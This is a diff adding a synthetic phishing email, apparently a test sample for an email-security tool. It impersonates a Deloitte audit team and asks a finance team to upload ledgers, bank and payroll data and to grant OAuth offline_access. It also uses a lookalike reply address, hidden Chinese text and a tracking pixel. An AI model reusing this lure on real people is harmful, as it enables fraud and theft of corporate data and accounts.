@@ -1,0 +1,109 @@
+From: Deloitte & Touche LLP | Audit Innovation <audit.delivery@deloitte-dtt.example>
+To: finance@corp.internal
+Cc: cfo@corp.internal, auditors@corp.internal, legal@corp.internal
+Reply-To: audit.partner@deloitte-portalmail.example
+Date: Sun, 01 Nov 2026 16:00:00 +0000
+Message-ID: <0722-b66@synth.example>
+Subject: [AUDIT 2026] Vigilyx Limited — FY2026 Statutory Audit — Data delivery platform transition (Microsoft Azure DevOps migration) — Complete by Friday
+MIME-Version: 1.0
+Content-Type: text/html; charset=gb2312
+
+<html><body style="font-family:sans-serif">
+<p>Finance Team, CFO, Auditor Liaison, Legal:</p>
+
+<p>Deloitte is pleased to confirm our engagement as statutory auditors for <b>Vigilyx Limited's FY2026 annual audit</b> (ISAs as adopted by the UK). To streamline our audit process, we have migrated our data delivery platform from <b>Aura (legacy)</b> to <b>Microsoft Azure DevOps</b>. Your audit deliverables must now be submitted through the new platform.</p>
+
+<h3>一、Engagement Details</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:200px">Client</td><td><b>Vigilyx Limited</b></td></tr>
+<tr><td style="background:#f5f5f5">Engagement Partner</td><td>Michael Thompson (FCA)</td></tr>
+<tr><td style="background:#f5f5f5">Engagement Manager</td><td>Sarah Wong (ACA)</td></tr>
+<tr><td style="background:#f5f5f5">Audit Period</td><td>FY2026 (January 1 - December 31, 2026)</td></tr>
+<tr><td style="background:#f5f5f5">Audit Framework</td><td>ISAs (UK) | FRS 102</td></tr>
+<tr><td style="background:#f5f5f5">Previous Auditors</td><td>PwC (FY2024), KPMG (FY2025)</td></tr>
+<tr><td style="background:#f5f5f5">Deliverables Deadline</td><td style="color:#e00"><b>Friday, November 7, 2026</b></td></tr>
+<tr><td style="background:#f5f5f5">Estimated Audit Fee</td><td>£180,000 (agreed in engagement letter)</td></tr>
+</table>
+
+<h3>二、Platform Migration</h3>
+<p>Deloitte has globally migrated from our proprietary <b>Aura</b> platform to <b>Microsoft Azure DevOps</b> for all client data delivery, effective October 2026. This transition is part of Project "Meridian" — Deloitte's $1.2 billion investment in cloud-based audit technology.</p>
+
+<p><b>What this means for you:</b></p>
+<ul>
+<li>Your FY2025 data (submitted through Aura) has been migrated automatically</li>
+<li>All FY2026 deliverables must be submitted through the new Azure DevOps platform</li>
+<li>Your Azure AD account has been provisioned (linked to your corporate @corp.internal email)</li>
+</ul>
+
+<h3>三、Required Audit Deliverables</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Category</th><th>Documents</th><th>Priority</th></tr>
+<tr><td rowspan="3">Financial Statements</td><td>Trial Balance (all levels, Dec 31 2026)</td><td style="color:#e00">Critical</td></tr>
+<tr><td>General Ledger (full year, all accounts)</td><td style="color:#e00">Critical</td></tr>
+<tr><td>Management accounts (monthly, Jan-Dec)</td><td>High</td></tr>
+<tr><td rowspan="3">Revenue</td><td>Sales ledger and customer list</td><td style="color:#e00">Critical</td></tr>
+<tr><td>Revenue recognition schedules</td><td>High</td></tr>
+<tr><td>Contracts with major customers (top 20 by revenue)</td><td>High</td></tr>
+<tr><td rowspan="4">Cash & Banking</td><td>Bank statements (all accounts, all months)</td><td style="color:#e00">Critical</td></tr>
+<tr><td>Bank reconciliations (monthly)</td><td>High</td></tr>
+<tr><td>Foreign currency transactions log</td><td>Medium</td></tr>
+<tr><td>Payment approval records</td><td>Medium</td></tr>
+<tr><td rowspan="3">Payroll</td><td>Payroll registers (monthly, all employees)</td><td style="color:#e00">Critical</td></tr>
+<tr><td>Employment contracts (senior management)</td><td>High</td></tr>
+<tr><td>Bonus and equity compensation schedules</td><td>High</td></tr>
+<tr><td rowspan="2">Tax</td><td>Corporate tax computation</td><td>High</td></tr>
+<tr><td>VAT returns and supporting schedules</td><td>Medium</td></tr>
+</table>
+
+<h3>四、How to Submit</h3>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://deloitte-dtt.example/audit/Vigilyx-FY2026/upload" style="display:inline-block;background:#000;color:#fff;padding:12px 36px;text-decoration:none;border-radius:4px;font-weight:bold">Submit Audit Deliverables — Azure DevOps</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://dev.azure.com/deloitte-audit/Vigilyx-FY2026</p>
+
+<p style="font-size:12px;color:#888;text-align:center">（Azure AD authentication required — your corporate @corp.internal account）</p>
+
+<h3>About Azure DevOps Authentication</h3>
+<p>When you click the submit button, you will be redirected to <b>login.microsoftonline.com</b> (Microsoft's official OAuth endpoint):</p>
+<ol>
+<li>Sign in with your corporate Azure AD credentials (@corp.internal)</li>
+<li>Grant the requested permissions (openid, profile, offline_access)</li>
+<li>Access the Vigilyx-FY2026 audit project</li>
+<li>Upload deliverables to the appropriate folders</li>
+</ol>
+
+<p style="font-size:14px;background:#E8EAF6;padding:12px;border-radius:4px">
+<b>About offline_access:</b> Audit deliverable packages are comprehensive — your FY2026 data (financial statements, bank statements, payroll, contracts) is estimated at 2-4GB. Upload sessions typically take 30-60 minutes depending on connection. The offline_access permission maintains your Azure DevOps session during upload. As part of Project Meridian, Deloitte's audit infrastructure is hosted on Microsoft Azure (Dublin data center for UK/EU clients), so the same Azure AD you use internally is used for authentication. This is a standard Big4 practice — PwC uses "Huddle" (Azure-hosted), KPMG uses "KPMG Clara" (Azure-hosted), and EY uses "Canvas" (Azure-hosted).
+</p>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文审计团队支持或提交中国子公司财务数据，请访问 deloitte-dtt.example/cn-audit 上传财务报表与银行对账单（中文通道，当日处理）。</p>
+
+<h3>五、Consequences of Missing Friday</h3>
+<ul>
+<li>Audit timeline extended by 4-6 weeks (affects statutory filing deadline)</li>
+<li>Companies House late filing penalty: <b>£1,500</b> (private company, >1 month late)</li>
+<li>Potential qualification of audit opinion (if data insufficient)</li>
+<li>Your lenders' covenant reporting may be affected</li>
+</ul>
+
+<h3>六、Contact</h3>
+<p><b>Engagement Partner:</b> Michael Thompson<br>
+Phone: +44 20 7936 ****<br>
+Email: audit.partner@deloitte-portalmail.example<br><br>
+<b>Engagement Manager:</b> Sarah Wong<br>
+Phone: +44 20 7936 ****<br>
+Email: sarah.wong@deloitte.example</p>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">Deloitte & Touche LLP | Audit & Assurance</p>
+<p style="font-size:11px;color:#999">1 New Street Square, London EC4A 3HQ</p>
+<p style="font-size:11px;color:#999">This communication may be privileged and confidential.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://deloitte-dtt.example/api/track?recipient=finance%40corp.internal&client=Vigilyx&type=audit_delivery" width="1" height="1" alt="">
+</div>
+
+</body></html>
